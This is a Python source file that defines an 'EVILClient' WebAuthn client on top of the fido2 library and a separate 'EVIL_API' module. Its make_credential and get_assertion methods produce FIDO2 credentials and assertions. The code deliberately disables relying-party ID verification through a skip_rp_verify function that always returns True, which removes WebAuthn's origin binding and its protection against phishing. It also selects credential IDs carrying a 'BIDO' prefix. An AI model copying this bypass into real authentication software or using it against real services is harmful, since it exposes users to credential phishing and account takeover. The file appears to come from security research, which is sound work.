from fido2.webauthn import *
from fido2.rpid import verify_rp_id
from fido2.client import *
from fido2.client import _BaseClient
from EVIL_FIDO.EVIL_api import *

def skip_rp_verify(rp_id, origin):
	return True

class EVILClient(WebAuthnClient, _BaseClient):
	def __init__(self, origin, verify=verify_rp_id, handle=None):
		super().__init__(origin, verify=skip_rp_verify)
		self.api=EvilAPI(handle)
	
	@staticmethod
	def is_available():
		return True
		
	def make_credential(self, options, **kwargs):
		options = PublicKeyCredentialCreationOptions.from_dict(options)
		self._verify_rp_id(options.rp.id)
		client_data = self._build_client_data(
			CollectedClientData.TYPE.CREATE, options.challenge
		)
		selection = options.authenticator_selection or AuthenticatorSelectionCriteria()
		try:
			result = self.api.make_credential(
				options.rp,
				options.user,
				options.pub_key_cred_params,
				client_data,
				options.timeout or 0,
				selection.require_resident_key or False,
				0,
				0,
				0,
				options.exclude_credentials,
				options.extensions,
				kwargs.get("event"),
			)
		except OSError as e:
			raise ClientError.ERR.OTHER_ERROR(e)

		return AuthenticatorAttestationResponse(
			client_data, AttestationObject(result), {}
		)
		
	def get_assertion(self, options, **kwargs):
		options = PublicKeyCredentialRequestOptions.from_dict(options)
		key_id=b''
		for xx in options.allow_credentials:
			id=xx.id
			if id[:4]==b'BIDO':
				key_id=id
				break
				
		self._verify_rp_id(options.rp_id)
		client_data = self._build_client_data(
			CollectedClientData.TYPE.GET, options.challenge
		)
		
		try:
			(credential, auth_data, signature, user_id) = self.api.get_assertion(
				options.rp_id,
				client_data,
				options.timeout or 0,
				WebAuthNAuthenticatorAttachment.ANY,
				WebAuthNUserVerificationRequirement.from_string(
				options.user_verification or "discouraged"
				),
			options.allow_credentials,
			options.extensions,
			key_id,
			kwargs.get("event"),
			)
		except OSError as e:
			raise ClientError.ERR.OTHER_ERROR(e)
		
		user = {"id": user_id} if user_id else None
		return AssertionSelection(
			client_data,
			[
				AssertionResponse(
					credential=credential,
					auth_data=auth_data,
					signature=signature,
					user=user,
				)
			],
		)
